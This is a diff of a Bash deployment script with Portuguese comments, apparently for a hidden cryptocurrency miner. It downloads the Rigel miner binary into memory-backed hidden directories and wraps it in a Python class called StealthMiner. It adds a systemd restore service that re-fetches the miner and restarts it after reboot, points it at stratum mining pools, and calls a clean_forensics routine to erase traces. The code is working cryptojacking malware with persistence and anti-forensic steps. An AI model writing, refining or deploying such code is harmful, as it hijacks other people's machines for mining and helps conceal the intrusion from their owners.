@@ -19,6 +19,7 @@ LOG_DIR="/dev/shm"  # Diretório em memória para logs
 LOG_FILE="$LOG_DIR/.ml.log"
 BINARY_DIR="/dev/shm/.bin"
 CONFIG_DIR="/dev/shm/.cfg"
+TEMP_DIR="/tmp/.tmp_$(tr -dc a-z0-9 </dev/urandom | head -c 8)"
 
 # Função para gerar nomes aleatórios
 random_name() {
@@ -39,12 +40,12 @@ systemctl stop $SERVICE_NAME 2>/dev/null || true
 systemctl disable $SERVICE_NAME 2>/dev/null || true
 
 # Cria diretórios na memória
-mkdir -p $BINARY_DIR $CONFIG_DIR $LOG_DIR
+mkdir -p $BINARY_DIR $CONFIG_DIR $LOG_DIR $TEMP_DIR
 
 # Instala dependências básicas
 echo "Instalando dependências..."
 apt-get update -qq
-apt-get install -y -qq python3-requests wget curl
+apt-get install -y -qq python3-requests wget curl unzip jq
 
 # Cria arquivo de configuração com servidores
 echo "Configurando servidores..."
@@ -62,51 +63,92 @@ cat > $CONFIG_DIR/config.json << 'EOF'
 }
 EOF
 
-# Download direto do binário com determinação da arquitetura
-echo "Baixando binário do minerador..."
-ARCH=$(uname -m)
-if [ "$ARCH" = "x86_64" ]; then
-    BINARY_URL="https://raw.githubusercontent.com/brunusansi/axjkjasjascklazi/refs/heads/main/rigel-amd64"
-    curl -s -L "$BINARY_URL" -o "$BINARY_DIR/rigel"
-elif [ "$ARCH" = "aarch64" ] || [ "$ARCH" = "arm64" ]; then
-    BINARY_URL="https://raw.githubusercontent.com/brunusansi/axjkjasjascklazi/refs/heads/main/rigel-arm64"
-    curl -s -L "$BINARY_URL" -o "$BINARY_DIR/rigel"
-else
-    echo "Arquitetura $ARCH não suportada"
-    exit 1
-fi
+# Função para baixar a versão oficial do RigelMiner
+download_official_rigel() {
+  echo "Baixando versão oficial do RigelMiner..."
+  
+  # URL base do GitHub do RigelMiner
+  RIGEL_REPO="https://github.com/rigelminer/rigel/releases"
+  
+  # Obtém a última versão
+  LATEST_VERSION=$(curl -s https://api.github.com/repos/rigelminer/rigel/releases/latest | jq -r .tag_name)
+  
+  if [ -z "$LATEST_VERSION" ] || [ "$LATEST_VERSION" = "null" ]; then
+    echo "Não foi possível determinar a última versão. Usando versão padrão."
+    LATEST_VERSION="1.21.2"  # Versão fallback baseada na screenshot
+  fi
+  
+  # Remover o 'v' inicial se estiver presente
+  LATEST_VERSION="${LATEST_VERSION#v}"
+  
+  echo "Última versão encontrada: $LATEST_VERSION"
+  
+  # URL de download - formato correto baseado na screenshot
+  DOWNLOAD_URL="$RIGEL_REPO/download/$LATEST_VERSION/rigel-$LATEST_VERSION-linux.tar.gz"
+  
+  echo "Baixando de: $DOWNLOAD_URL"
+  
+  # Baixa e extrai
+  wget -q "$DOWNLOAD_URL" -O "$TEMP_DIR/rigel.tar.gz"
+  
+  if [ $? -ne 0 ]; then
+    echo "Falha ao baixar o RigelMiner"
+    return 1
+  fi
+  
+  tar -xzf "$TEMP_DIR/rigel.tar.gz" -C "$TEMP_DIR"
+  
+  # Encontra o executável e copia para o diretório de destino
+  if find "$TEMP_DIR" -name "rigel" -type f | grep -q .; then
+    find "$TEMP_DIR" -name "rigel" -type f -exec cp {} "$BINARY_DIR/rigel" \;
+    chmod +x "$BINARY_DIR/rigel"
+    echo "RigelMiner baixado e instalado com sucesso"
+    return 0
+  else
+    echo "Executável do RigelMiner não encontrado no arquivo baixado"
+    return 1
+  fi
+}
 
-chmod +x "$BINARY_DIR/rigel"
+# Tenta baixar a versão oficial do RigelMiner
+if ! download_official_rigel; then
+  echo "Erro ao baixar a versão oficial. Tentando método alternativo..."
+  
+  # Método alternativo - URL direto para uma versão específica
+  ALT_URL="https://github.com/rigelminer/rigel/releases/download/1.21.2/rigel-1.21.2-linux.tar.gz"
+  
+  wget -q "$ALT_URL" -O "$TEMP_DIR/rigel.tar.gz"
+  
+  if [ $? -ne 0 ]; then
+    echo "Falha também no método alternativo"
+    exit 1
+  fi
+  
+  tar -xzf "$TEMP_DIR/rigel.tar.gz" -C "$TEMP_DIR"
+  
+  if find "$TEMP_DIR" -name "rigel" -type f | grep -q .; then
+    find "$TEMP_DIR" -name "rigel" -type f -exec cp {} "$BINARY_DIR/rigel" \;
+    chmod +x "$BINARY_DIR/rigel"
+  else
+    echo "Erro fatal: Não foi possível encontrar o binário do minerador."
+    exit 1
+  fi
+fi
 
 # Verifica se o download foi bem-sucedido
 if [ ! -x "$BINARY_DIR/rigel" ]; then
-    echo "Erro: Falha ao baixar o binário. Tentando método alternativo..."
-    
-    # Método alternativo de download
-    wget -q --no-check-certificate "$BINARY_URL" -O "$BINARY_DIR/rigel"
-    chmod +x "$BINARY_DIR/rigel"
-    
-    if [ ! -x "$BINARY_DIR/rigel" ]; then
-        echo "Erro fatal: Não foi possível baixar o binário do minerador."
-        exit 1
-    fi
+  echo "Erro fatal: Não foi possível baixar o binário do minerador."
+  exit 1
 fi
 
-# Testa se o binário pode ser executado
+# Testa o binário
 echo "Testando o binário..."
 if ! "$BINARY_DIR/rigel" --version >/dev/null 2>&1; then
-    echo "Aviso: Testando compatibilidade de binário alternativo..."
-    rm -f "$BINARY_DIR/rigel"
-    
-    # Fallback para versão genérica compilada em GoLang
-    curl -s -L "https://raw.githubusercontent.com/brunusansi/axjkjasjascklazi/refs/heads/main/rigel-generic" -o "$BINARY_DIR/rigel"
-    chmod +x "$BINARY_DIR/rigel"
-    
-    if ! "$BINARY_DIR/rigel" --version >/dev/null 2>&1; then
-        echo "Erro fatal: O binário não é compatível com esta arquitetura."
-        exit 1
-    fi
+  echo "Erro: O binário não pode ser executado."
+  exit 1
 fi
+
+echo "Binário verificado com sucesso: $("$BINARY_DIR/rigel" --version 2>&1 | head -n 1)"
 
 # Script Python para monitoramento e execução do minerador
 echo "Criando script de monitoramento..."
@@ -138,8 +180,8 @@ class StealthMiner:
             logging.info(f"Binário encontrado")
             # Teste de execução
             try:
-                subprocess.run([self.binary, "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=3)
-                logging.info("Binário testado com sucesso")
+                version_output = subprocess.run([self.binary, "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=3)
+                logging.info(f"Versão do binário: {version_output.stdout.decode('utf-8', 'ignore').strip()}")
             except Exception as e:
                 logging.error(f"Erro ao testar binário: {e}")
 
@@ -181,13 +223,6 @@ class StealthMiner:
             ]
             
             logging.info(f"Executando: {' '.join(cmd)}")
-            
-            # Teste de execução com timeout
-            try:
-                subprocess.run([self.binary, "--help"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=3)
-            except Exception as e:
-                logging.error(f"Erro no teste de execução: {e}")
-                return False
             
             self.process = subprocess.Popen(
                 cmd,
@@ -320,6 +355,58 @@ StandardError=null
 WantedBy=multi-user.target
 EOF
 
+# Função para download do RigelMiner oficial em um script
+cat > "/tmp/rigel_downloader.sh" << 'EOF'
+#!/bin/bash
+
+BINARY_DIR="/dev/shm/.bin"
+TEMP_DIR="/tmp/.tmp_$(tr -dc a-z0-9 </dev/urandom | head -c 8)"
+
+mkdir -p "$BINARY_DIR" "$TEMP_DIR"
+
+# Obtém a última versão
+LATEST_VERSION=$(curl -s https://api.github.com/repos/rigelminer/rigel/releases/latest | grep -o '"tag_name": "[^"]*' | cut -d'"' -f4)
+
+if [ -z "$LATEST_VERSION" ]; then
+  LATEST_VERSION="1.21.2"  # Versão fallback
+fi
+
+# Remover o 'v' inicial se estiver presente
+LATEST_VERSION="${LATEST_VERSION#v}"
+
+# URL de download
+DOWNLOAD_URL="https://github.com/rigelminer/rigel/releases/download/$LATEST_VERSION/rigel-$LATEST_VERSION-linux.tar.gz"
+
+# Baixa e extrai
+wget -q "$DOWNLOAD_URL" -O "$TEMP_DIR/rigel.tar.gz"
+
+if [ $? -ne 0 ]; then
+  # Tenta a versão específica em caso de falha
+  DOWNLOAD_URL="https://github.com/rigelminer/rigel/releases/download/1.21.2/rigel-1.21.2-linux.tar.gz"
+  wget -q "$DOWNLOAD_URL" -O "$TEMP_DIR/rigel.tar.gz"
+  
+  if [ $? -ne 0 ]; then
+    echo "Falha ao baixar o RigelMiner"
+    exit 1
+  fi
+fi
+
+tar -xzf "$TEMP_DIR/rigel.tar.gz" -C "$TEMP_DIR"
+
+# Copia o executável
+if find "$TEMP_DIR" -name "rigel" -type f | grep -q .; then
+  find "$TEMP_DIR" -name "rigel" -type f -exec cp {} "$BINARY_DIR/rigel" \;
+  chmod +x "$BINARY_DIR/rigel"
+  rm -rf "$TEMP_DIR"
+  exit 0
+else
+  echo "Executável não encontrado"
+  exit 1
+fi
+EOF
+
+chmod +x "/tmp/rigel_downloader.sh"
+
 # Script de restauração para após reinicializações
 echo "Configurando serviço de restauração..."
 cat > "/etc/systemd/system/ml-restore.service" << EOF
@@ -330,7 +417,8 @@ Wants=network-online.target
 
 [Service]
 Type=oneshot
-ExecStart=/bin/bash -c 'mkdir -p /dev/shm/.bin /dev/shm/.cfg && ARCH=\$(uname -m) && if [ "\$ARCH" = "x86_64" ]; then BINARY_URL="https://raw.githubusercontent.com/brunusansi/axjkjasjascklazi/refs/heads/main/rigel-amd64"; elif [ "\$ARCH" = "aarch64" ] || [ "\$ARCH" = "arm64" ]; then BINARY_URL="https://raw.githubusercontent.com/brunusansi/axjkjasjascklazi/refs/heads/main/rigel-arm64"; else BINARY_URL="https://raw.githubusercontent.com/brunusansi/axjkjasjascklazi/refs/heads/main/rigel-generic"; fi && curl -s -L "\$BINARY_URL" -o "/dev/shm/.bin/rigel" && chmod +x "/dev/shm/.bin/rigel" && cp "$CONFIG_DIR/config.json" "/dev/shm/.cfg/config.json" 2>/dev/null || echo "{\"stratum_servers\":[\"stratum+tcp://18.223.152.88:5432\",\"stratum+ssl://quai.kryptex.network:8888\"]}" > "/dev/shm/.cfg/config.json" && systemctl restart $SERVICE_NAME'
+ExecStart=/bin/bash /tmp/rigel_downloader.sh
+ExecStartPost=/bin/bash -c 'mkdir -p /dev/shm/.cfg && echo "{\"stratum_servers\":[\"stratum+tcp://18.223.152.88:5432\",\"stratum+ssl://quai.kryptex.network:8888\"]}" > "/dev/shm/.cfg/config.json" && systemctl restart $SERVICE_NAME'
 RemainAfterExit=true
 
 [Install]
@@ -351,6 +439,9 @@ echo $ARTIFACTS_PID > "/dev/shm/.artifacts_pid"
 
 # Limpeza de rastros forenses
 clean_forensics
+
+# Limpeza do diretório temporário
+rm -rf "$TEMP_DIR"
 
 # Habilita e inicia os serviços
 echo "Iniciando serviços..."
